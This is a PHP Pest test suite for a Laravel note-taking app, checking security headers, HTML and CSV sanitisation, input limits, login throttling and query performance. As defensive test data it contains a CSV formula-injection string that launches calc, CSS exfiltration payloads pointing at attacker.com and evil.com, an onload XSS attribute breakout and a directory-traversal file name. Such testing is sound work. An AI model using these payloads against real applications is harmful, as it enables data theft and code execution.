<?php

use App\Models\Category;
use App\Models\Folder;
use App\Models\Note;
use App\Models\User;
use App\Services\NoteChunkService;
use App\Services\NoteContentSanitizer;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Schema;

uses(RefreshDatabase::class);

test('security: responses include hardened security headers and omit x-powered-by', function () {
    $response = $this->get('/');

    $response->assertOk()
        ->assertHeader('X-Frame-Options', 'SAMEORIGIN')
        ->assertHeader('X-Content-Type-Options', 'nosniff')
        ->assertHeader('X-XSS-Protection', '1; mode=block')
        ->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin')
        ->assertHeader('Cross-Origin-Opener-Policy', 'same-origin')
        ->assertHeader('Cross-Origin-Resource-Policy', 'same-origin')
        ->assertHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=(), accelerometer=(), gyroscope=(), magnetometer=(), usb=()');

    expect($response->headers->has('Content-Security-Policy'))->toBeTrue()
        ->and($response->headers->get('Content-Security-Policy'))->toContain("default-src 'self'")
        ->and($response->headers->has('X-Powered-By'))->toBeFalse();
});

test('security: https requests attach strict transport security header', function () {
    $response = $this->get('https://localhost/');

    $response->assertOk()
        ->assertHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
});

test('security: csv export neutralizes formula and dde injection triggers', function () {
    $user = User::factory()->create();
    $note = Note::factory()->create([
        'user_id' => $user->id,
        'title' => '=cmd|\' /C calc\'!A0',
        'category' => '+123456789',
        'content' => '<p>-DangerousFormula</p>',
    ]);

    $response = $this->actingAs($user)->get("/api/notes/{$note->id}/export/csv");
    $response->assertOk();

    $csv = $response->getContent();
    expect($csv)->toContain("'=cmd|' /C calc'!A0")
        ->and($csv)->toContain("'+123456789")
        ->and($csv)->toContain("'-DangerousFormula");
});

test('security: import rejects dangerous file extensions like php or exe', function () {
    $user = User::factory()->create();
    $badFile = UploadedFile::fake()->createWithContent('exploit.php', '<?php phpinfo(); ?>');

    $response = $this->actingAs($user)->postJson('/api/notes/import', [
        'file' => $badFile,
    ]);

    $response->assertStatus(422)
        ->assertJsonValidationErrors('file');
});

test('security: note content sanitizer strips css url and expression exfiltration while preserving safe styles', function () {
    $sanitizer = app(NoteContentSanitizer::class);

    $malicious = '<p style="color: red; background: url(\'http://attacker.com/leak\');">Text</p>';
    $clean = $sanitizer->sanitize($malicious);
    expect($clean)->not->toContain('url(')
        ->and($clean)->not->toContain('attacker.com');

    $safe = '<p style="color: blue; text-align: center; border: 1px solid black;">Safe text</p>';
    $cleanSafe = $sanitizer->sanitize($safe);
    expect($cleanSafe)->toContain('color: blue')
        ->and($cleanSafe)->toContain('text-align: center');
});

test('security: links with target blank automatically receive noopener to prevent reverse tabnabbing', function () {
    $sanitizer = app(NoteContentSanitizer::class);

    $html = '<a href="https://example.com" target="_blank">External Link</a>';
    $clean = $sanitizer->sanitize($html);

    expect($clean)->toContain('rel="noopener noreferrer"');
});

test('security: bulk operations reject arrays exceeding 100 items to prevent denial of service', function () {
    $user = User::factory()->create();
    $tooManyIds = range(1, 101);

    $response = $this->actingAs($user)->postJson('/api/notes/bulk-delete', [
        'ids' => $tooManyIds,
    ]);

    $response->assertStatus(422)
        ->assertJsonValidationErrors('ids');
});

test('performance: telemetry stats calculates aggregated metrics via single database query', function () {
    $user = User::factory()->create();
    Note::factory()->count(5)->create([
        'user_id' => $user->id,
        'word_count' => 100,
        'xp' => 300,
        'is_pinned' => true,
        'is_favorite' => false,
    ]);

    $response = $this->actingAs($user)->getJson('/api/player-stats');
    $response->assertOk()
        ->assertJsonPath('data.total_notes', 5)
        ->assertJsonPath('data.total_words', 500)
        ->assertJsonPath('data.total_xp', 1500)
        ->assertJsonPath('data.pinned_notes', 5)
        ->assertJsonPath('data.favorite_notes', 0);
});

test('security: csp policy enforces base-uri self, object-src none, and upgrade-insecure-requests', function () {
    $response = $this->get('/');
    $csp = (string) $response->headers->get('Content-Security-Policy');

    expect($csp)->toContain("base-uri 'self'")
        ->and($csp)->toContain("object-src 'none'")
        ->and($csp)->toContain('upgrade-insecure-requests');
});

test('security: csv export neutralizes formula triggers with leading whitespace and pipe symbols', function () {
    $user = User::factory()->create();
    $note = Note::factory()->create([
        'user_id' => $user->id,
        'title' => '   =cmd|\' /C calc\'!A0',
        'category' => ' |123456789',
        'content' => '<p>  -DangerousFormulaWithSpaces</p>',
    ]);

    $response = $this->actingAs($user)->get("/api/notes/{$note->id}/export/csv");
    $response->assertOk();

    $csv = $response->getContent();
    expect($csv)->toContain("'   =cmd|' /C calc'!A0")
        ->and($csv)->toContain("' |123456789")
        ->and($csv)->toContain("'-DangerousFormulaWithSpaces");
});

test('security: html export attaches strict content security policy meta tag', function () {
    $user = User::factory()->create();
    $note = Note::factory()->create([
        'user_id' => $user->id,
        'title' => 'Secure Export Scroll',
        'content' => '<p>Sanitized content</p>',
    ]);

    $response = $this->actingAs($user)->get("/api/notes/{$note->id}/export/html");
    $response->assertOk();

    $html = $response->getContent();
    expect($html)->toContain('<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; style-src \'unsafe-inline\'; img-src data: https:;">');
});

test('security: category bulk delete rejects arrays exceeding 100 items', function () {
    $user = User::factory()->create();
    $tooManyIds = range(1, 101);

    $response = $this->actingAs($user)->postJson('/api/categories/bulk-delete', [
        'ids' => $tooManyIds,
    ]);

    $response->assertStatus(422)
        ->assertJsonValidationErrors('ids');
});

test('performance: composite indexes exist on notes table for user_id, pinned, and category', function () {
    expect(Schema::hasIndex('notes', 'notes_user_id_pinned_updated_index'))->toBeTrue()
        ->and(Schema::hasIndex('notes', 'notes_user_id_category_updated_index'))->toBeTrue();
});

test('security: dom clobbering defense removes reserved system ids from note content', function () {
    $sanitizer = app(NoteContentSanitizer::class);

    $clobberingHtml = '<div id="save-now-btn"><span id="note-title-input">Sneaky</span><p id="section-safe-1">Safe</p></div>';
    $clean = $sanitizer->sanitize($clobberingHtml);

    expect($clean)->not->toContain('id="save-now-btn"')
        ->and($clean)->not->toContain('id="note-title-input"')
        ->and($clean)->toContain('id="section-safe-1"');
});

test('security: note title sanitizes null bytes and control characters', function () {
    $user = User::factory()->create();

    $response = $this->actingAs($user)->postJson('/api/notes', [
        'title' => "Dangerous\0Null\x07Byte\tTitle",
        'content' => '<p>Normal text</p>',
    ]);

    $response->assertStatus(201);
    $createdNote = Note::find($response->json('data.id'));

    expect($createdNote->title)->not->toContain("\0")
        ->and($createdNote->title)->not->toContain("\x07");
});

test('security: chunk verification uses constant-time hash comparison and flags tampered chunks', function () {
    $user = User::factory()->create();
    $note = Note::factory()->create(['user_id' => $user->id]);
    $chunkService = app(NoteChunkService::class);
    $chunkService->syncChunks($note, '<p>Original text shard</p>');

    $verifyRes = $this->actingAs($user)->getJson("/api/notes/{$note->id}/chunks/verify");
    $verifyRes->assertOk()
        ->assertJsonPath('data.status', 'verified');

    // Tamper with chunk checksum
    $chunk = $note->chunks()->first();
    $chunk->update(['checksum' => hash('sha256', 'tampered')]);

    $tamperedRes = $this->actingAs($user)->getJson("/api/notes/{$note->id}/chunks/verify");
    $tamperedRes->assertOk()
        ->assertJsonPath('data.status', 'corrupted');
});

test('performance: landing page does not perform unnecessary queries for private note titles', function () {
    $response = $this->get('/');
    $response->assertOk()
        ->assertViewMissing('sampleNotes');
});

test('security: sensitive dynamic endpoints attach private no-store cache controls', function () {
    $user = User::factory()->create();

    $response = $this->actingAs($user)->getJson('/api/player-stats');
    $response->assertOk();
    $cacheHeader = (string) $response->headers->get('Cache-Control');
    expect($cacheHeader)->toContain('no-store')
        ->and($cacheHeader)->toContain('private')
        ->and($response->headers->get('X-Robots-Tag'))->toBe('noindex, nofollow, noarchive');

    $studioResponse = $this->actingAs($user)->get('/studio');
    $studioResponse->assertOk();
    $studioCache = (string) $studioResponse->headers->get('Cache-Control');
    expect($studioCache)->toContain('no-store')
        ->and($studioCache)->toContain('private')
        ->and($studioResponse->headers->get('X-Robots-Tag'))->toBe('noindex, nofollow, noarchive');
});

test('performance: folder allDescendantIds resolves deep hierarchy in a single indexed query', function () {
    $user = User::factory()->create();
    $f1 = Folder::factory()->create(['user_id' => $user->id, 'name' => 'F1']);
    $f2 = Folder::factory()->create(['user_id' => $user->id, 'parent_id' => $f1->id, 'name' => 'F2']);
    $f3 = Folder::factory()->create(['user_id' => $user->id, 'parent_id' => $f2->id, 'name' => 'F3']);
    $f4 = Folder::factory()->create(['user_id' => $user->id, 'parent_id' => $f3->id, 'name' => 'F4']);

    DB::enableQueryLog();
    DB::flushQueryLog();

    $descendants = $f1->allDescendantIds();

    $queryCount = count(DB::getQueryLog());
    expect($queryCount)->toBe(1)
        ->and($descendants)->toContain($f2->id, $f3->id, $f4->id);
});

test('security: ai assistant generic exception hides internal server trace and returns 502 with sanitized message', function () {
    config(['services.ai.key' => 'secret-test', 'services.ai.model' => 'test-model', 'services.ai.base_url' => 'https://ai.example/v1']);
    Http::preventStrayRequests();
    Http::fake(function () {
        throw new RuntimeException('Database server /var/run/mysqld.sock connection refused on internal IP 10.0.0.5');
    });

    $note = Note::factory()->create();
    $response = $this->postJson(route('notes.assistant', $note), ['action' => 'improve', 'content' => 'Draft']);

    $response->assertStatus(502)
        ->assertJsonPath('status', 'error')
        ->assertJsonPath('message', 'Layanan AI mengalami kendala internal. Silakan coba lagi nanti.')
        ->assertDontSee('10.0.0.5')
        ->assertDontSee('mysqld.sock');
});

test('performance: markdown import and json import default typography to sans', function () {
    $user = User::factory()->create();
    $service = app(NoteChunkService::class);

    $mdNote = $service->importMarkdown("# Clean Typography\n\nDefault font test.", 'clean.md', 'catatan', $user);
    expect($mdNote->font_family)->toBe('sans');

    $jsonNote = $service->importMarkdown(json_encode([
        'title' => 'JSON Typography Test',
        'content' => '<p>Test</p>',
    ]), null, 'catatan', $user);
    expect($jsonNote->font_family)->toBe('sans');
});

test('security: security headers include x-permitted-cross-domain-policies none and remove server header', function () {
    $response = $this->get('/');

    $response->assertOk()
        ->assertHeader('X-Permitted-Cross-Domain-Policies', 'none');

    expect($response->headers->has('Server'))->toBeFalse();
});

test('performance: new composite indexes exist for folders, categories, and note words', function () {
    expect(Schema::hasIndex('folders', 'folders_user_id_name_index'))->toBeTrue()
        ->and(Schema::hasIndex('categories', 'categories_is_system_user_name_index'))->toBeTrue()
        ->and(Schema::hasIndex('notes', 'notes_user_pinned_words_index'))->toBeTrue();
});

test('security: profile password change re-authenticates and regenerates session id', function () {
    $user = User::factory()->create([
        'password' => bcrypt('old-password'),
    ]);

    $this->actingAs($user);
    $sessionIdBefore = session()->getId();

    $response = $this->putJson('/profile', [
        'name' => $user->name,
        'email' => $user->email,
        'current_password' => 'old-password',
        'password' => 'new-secure-password-123',
        'password_confirmation' => 'new-secure-password-123',
    ]);

    $response->assertOk();
    $sessionIdAfter = session()->getId();

    expect($sessionIdAfter)->not->toBe($sessionIdBefore);
});

test('performance: database backup command includes folders table in backup payload', function () {
    $user = User::factory()->create();
    Folder::factory()->create(['user_id' => $user->id, 'name' => 'Chronicles']);

    $testBackupFile = 'test_folders_backup_'.time();
    $this->artisan("db:backup --file={$testBackupFile}")->assertSuccessful();

    $backupPath = database_path("backups/{$testBackupFile}.json");
    expect(file_exists($backupPath))->toBeTrue();

    $content = json_decode(file_get_contents($backupPath), true);
    expect(isset($content['tables']['folders']))->toBeTrue()
        ->and($content['tables']['folders']['count'])->toBeGreaterThanOrEqual(1);

    // Clean up temporary test backup files
    @unlink($backupPath);
    @unlink(database_path("backups/{$testBackupFile}.sql"));
});

test('performance: sitemap route serves xml with public daily cache header and validates file presence', function () {
    $response = $this->get('/sitemap.xml');
    $response->assertOk()
        ->assertHeader('Content-Type', 'application/xml; charset=UTF-8');

    $cacheHeader = (string) $response->headers->get('Cache-Control');
    expect($cacheHeader)->toContain('public')
        ->and($cacheHeader)->toContain('max-age=86400');
});

test('security: bulk operations reject duplicate ids in payload using distinct validation rule', function () {
    $user = User::factory()->create();
    $note = Note::factory()->create(['user_id' => $user->id]);

    $response = $this->actingAs($user)->postJson('/api/notes/bulk-delete', [
        'ids' => [$note->id, $note->id],
    ]);

    $response->assertStatus(422)
        ->assertJsonValidationErrors('ids.0');
});

test('performance: reordering chunks avoids redundant updates on unchanged positions', function () {
    $user = User::factory()->create();
    $note = Note::factory()->create(['user_id' => $user->id]);
    $service = app(NoteChunkService::class);
    $text = str_repeat('A', 1005)."\n\n".str_repeat('B', 1005)."\n\n".str_repeat('C', 1005);
    $chunks = $service->syncChunks($note, $text);

    expect(count($chunks))->toBeGreaterThanOrEqual(3);

    DB::enableQueryLog();
    DB::flushQueryLog();

    // Swap only first two chunks: [1, 0, 2, 3, ...]
    $order = array_map(fn ($c) => $c->id, $chunks);
    $temp = $order[0];
    $order[0] = $order[1];
    $order[1] = $temp;

    $service->reorderChunks($note, $order);

    $queries = DB::getQueryLog();
    $updateChunkQueries = array_filter($queries, function ($q) {
        return str_contains(strtolower($q['query']), 'update') && str_contains(strtolower($q['query']), 'note_chunks');
    });

    // Only chunks 0 and 1 needed index updates, remaining chunks were skipped
    expect(count($updateChunkQueries))->toBe(2);
});

test('performance: player stats telemetry computes total chunks via direct indexed join', function () {
    $user = User::factory()->create();
    $note = Note::factory()->create(['user_id' => $user->id]);
    $text = str_repeat('X', 1005)."\n\n".str_repeat('Y', 1005);
    $chunks = app(NoteChunkService::class)->syncChunks($note, $text);
    $expectedCount = count($chunks);

    DB::enableQueryLog();
    DB::flushQueryLog();

    $response = $this->actingAs($user)->getJson('/api/player-stats');
    $response->assertOk()
        ->assertJsonPath('data.total_chunks', $expectedCount);

    $queries = DB::getQueryLog();
    $hasCorrelatedWhereHas = false;
    foreach ($queries as $q) {
        if (str_contains(strtolower($q['query']), 'exists') && str_contains(strtolower($q['query']), 'note_chunks')) {
            $hasCorrelatedWhereHas = true;
        }
    }

    expect($hasCorrelatedWhereHas)->toBeFalse();
});

test('security: login endpoint throttles brute force attempts after 10 requests', function () {
    for ($i = 0; $i < 10; $i++) {
        $this->post(route('login'), [
            'email' => 'attacker@notenux.dev',
            'password' => 'wrong-pass-'.$i,
        ]);
    }

    $response = $this->post(route('login'), [
        'email' => 'attacker@notenux.dev',
        'password' => 'wrong-pass-11',
    ]);

    $response->assertStatus(429);
});

test('security: note content sanitizer removes null bytes and neutralizes css binding and import exfiltrations', function () {
    $sanitizer = app(NoteContentSanitizer::class);

    $dirtyWithNullByte = "Hello \0 World<p>Safe \0 Text</p>";
    $sanitized = $sanitizer->sanitize($dirtyWithNullByte);
    expect($sanitized)->not->toContain("\0")
        ->and($sanitized)->toContain('Hello  World')
        ->and($sanitized)->toContain('Safe  Text');

    $dirtyStyleBinding = '<div style="color: blue; -moz-binding: url(http://attacker.com/xss.xml#test);">Malicious</div>';
    $cleanBinding = $sanitizer->sanitize($dirtyStyleBinding);
    expect($cleanBinding)->not->toContain('-moz-binding');

    $dirtyStyleImport = '<div style="color: red; @import url(http://attacker.com/xss.css);">Import Attack</div>';
    $cleanImport = $sanitizer->sanitize($dirtyStyleImport);
    expect($cleanImport)->not->toContain('@import');
});

test('security: note import sanitizes control characters from manuscript titles', function () {
    $user = User::factory()->create();

    $payload = [
        'title' => "Forbidden\x00Title\x1FWith\x08ControlChars",
        'content' => "## Clean Header\n\nSome body text here.",
    ];

    $response = $this->actingAs($user)->postJson('/api/notes/import', $payload);
    $response->assertStatus(201);

    $createdNote = Note::where('user_id', $user->id)->first();
    expect($createdNote->title)->toBe('ForbiddenTitleWithControlChars')
        ->and($createdNote->title)->not->toContain("\x00")
        ->and($createdNote->title)->not->toContain("\x1F")
        ->and($createdNote->title)->not->toContain("\x08");
});

test('security: category creation and update strips null bytes and control characters from category name', function () {
    $user = User::factory()->create();

    $response = $this->actingAs($user)->postJson(route('api.categories.store'), [
        'name' => "Special\x00Category\x1FName\x08",
        'color' => 'blue',
    ]);

    $response->assertCreated();
    $catId = $response->json('data.id');
    $category = Category::find($catId);
    expect($category->name)->toBe('SpecialCategoryName')
        ->and($category->name)->not->toContain("\x00")
        ->and($category->name)->not->toContain("\x1F");

    $updateRes = $this->actingAs($user)->putJson(route('api.categories.update', $category), [
        'name' => "Renamed\x00Category\x07",
    ]);

    $updateRes->assertOk();
    $category->refresh();
    expect($category->name)->toBe('RenamedCategory');
});

test('security: backup command sanitizes custom file names against directory traversal', function () {
    $traversalName = '../../evil_backup';
    $this->artisan("db:backup --file={$traversalName}")->assertSuccessful();

    $sanitizedPath = database_path('backups/evil_backup.json');
    expect(file_exists($sanitizedPath))->toBeTrue();
    expect(file_exists(base_path('evil_backup.json')))->toBeFalse();

    @unlink($sanitizedPath);
    @unlink(database_path('backups/evil_backup.sql'));
});

test('security: content sanitizer removes comments and blocks backslash css escape sequences', function () {
    $sanitizer = app(NoteContentSanitizer::class);

    $withComment = '<p>Visible text <!-- secret comment --></p>';
    $cleanComment = $sanitizer->sanitize($withComment);
    expect($cleanComment)->not->toContain('secret comment')
        ->and($cleanComment)->toContain('Visible text');

    $escapedCss = '<div style="color: blue; background: \\75\\72\\6c(http://evil.com/xss);">Attack</div>';
    $cleanCss = $sanitizer->sanitize($escapedCss);
    expect($cleanCss)->not->toContain('style=');
});

test('security: content sanitizer prevents dom clobbering of window and document properties', function () {
    $sanitizer = app(NoteContentSanitizer::class);

    $clobbering = '<p id="self"><span id="top"><a id="parent">Text</a></span></p>';
    $clean = $sanitizer->sanitize($clobbering);

    expect($clean)->not->toContain('id="self"')
        ->and($clean)->not->toContain('id="top"')
        ->and($clean)->not->toContain('id="parent"');
});

test('performance: landing page counts are cached in cache store', function () {
    Cache::flush();
    $response = $this->get('/');
    $response->assertOk();

    expect(Cache::has('notenux:landing_counts'))->toBeTrue();
});

test('performance: sqlite configuration specifies WAL journal mode and busy timeout', function () {
    $sqliteConfig = config('database.connections.sqlite');

    expect($sqliteConfig['journal_mode'])->toBe('WAL')
        ->and($sqliteConfig['busy_timeout'])->toBe(5000)
        ->and($sqliteConfig['synchronous'])->toBe('NORMAL');
});

test('performance: notes table contains optimized composite indexes for level sorting and favorite filtering', function () {
    expect(Schema::hasIndex('notes', 'notes_user_pinned_level_index'))->toBeTrue()
        ->and(Schema::hasIndex('notes', 'notes_user_fav_pinned_updated_index'))->toBeTrue();
});

test('security: note store update and bulk update strip control characters from category', function () {
    $user = User::factory()->create();

    // Store note with control chars in category
    $resStore = $this->actingAs($user)->postJson(route('notes.store'), [
        'title' => 'Sample Scroll',
        'category' => "Guild\x00Quest\x1FNotes\x07",
        'content' => '<p>Content</p>',
    ]);
    $resStore->assertStatus(201);
    $noteId = $resStore->json('data.id');
    $note = Note::find($noteId);
    expect($note->category)->toBe('GuildQuestNotes')
        ->and($note->category)->not->toContain("\x00")
        ->and($note->category)->not->toContain("\x1F");

    // Update note with control chars in category
    $resUpdate = $this->actingAs($user)->putJson(route('notes.update', $note), [
        'category' => "Secret\x00Category\x08",
    ]);
    $resUpdate->assertOk();
    $note->refresh();
    expect($note->category)->toBe('SecretCategory');

    // Bulk update notes with control chars in category
    $resBulk = $this->actingAs($user)->postJson(route('notes.bulk-update'), [
        'ids' => [$note->id],
        'category' => "Bulk\x00Sanitized\x1E",
    ]);
    $resBulk->assertOk();
    $note->refresh();
    expect($note->category)->toBe('BulkSanitized');
});

test('security: folder store and update strip control characters from category', function () {
    $user = User::factory()->create();

    // Store folder with control chars in category
    $resStore = $this->actingAs($user)->postJson(route('api.folders.store'), [
        'name' => 'Adventures Folder',
        'category' => "Raid\x00Tome\x1F",
    ]);
    $resStore->assertStatus(201);
    $folderId = $resStore->json('data.id');
    $folder = Folder::find($folderId);
    expect($folder->category)->toBe('RaidTome')
        ->and($folder->category)->not->toContain("\x00");

    // Update folder with control chars in category
    $resUpdate = $this->actingAs($user)->putJson(route('api.folders.update', $folder), [
        'category' => "Updated\x00Raid\x07",
    ]);
    $resUpdate->assertOk();
    $folder->refresh();
    expect($folder->category)->toBe('UpdatedRaid');
});

test('performance: note queries with level_desc and favorites_only sort efficiently', function () {
    $user = User::factory()->create();
    Note::factory()->count(10)->create([
        'user_id' => $user->id,
        'level' => fn () => fake()->numberBetween(1, 10),
        'is_favorite' => fn () => fake()->boolean(),
        'is_pinned' => fn () => fake()->boolean(),
    ]);

    $resLevel = $this->actingAs($user)->getJson(route('notes.index', ['sort' => 'level_desc']));
    $resLevel->assertOk()
        ->assertJsonCount(10, 'data');

    $resFav = $this->actingAs($user)->getJson(route('notes.index', ['favorites_only' => true]));
    $resFav->assertOk();
});

test('security: restore command enforces json extension and confines file paths', function () {
    $this->artisan('db:restore', ['file' => '../../nonexistent_file'])
        ->assertFailed();
});

test('security: content sanitizer strictly validates data-color-token values', function () {
    $sanitizer = app(NoteContentSanitizer::class);

    $valid = '<span data-color-token="emerald">Valid</span>';
    expect($sanitizer->sanitize($valid))->toContain('data-color-token="emerald"');

    $invalid = '<span data-color-token="xss&quot; onload=&quot;alert(1)&quot;">Invalid</span>';
    expect($sanitizer->sanitize($invalid))->not->toContain('data-color-token');
});

test('security: mysql configuration disables persistent connections to prevent connection state leakage', function () {
    $mysqlOptions = config('database.connections.mysql.options');

    expect($mysqlOptions)->toBeArray()
        ->and(array_key_exists(PDO::ATTR_PERSISTENT, $mysqlOptions))->toBeTrue()
        ->and($mysqlOptions[PDO::ATTR_PERSISTENT])->toBeFalse();
});

test('security: model prevents accessing missing attributes outside production', function () {
    expect(Model::preventsAccessingMissingAttributes())->toBeTrue();
});

test('performance: queue database and redis connections dispatch jobs after database commit', function () {
    expect(config('queue.connections.database.after_commit'))->toBeTrue()
        ->and(config('queue.connections.redis.after_commit'))->toBeTrue();
});
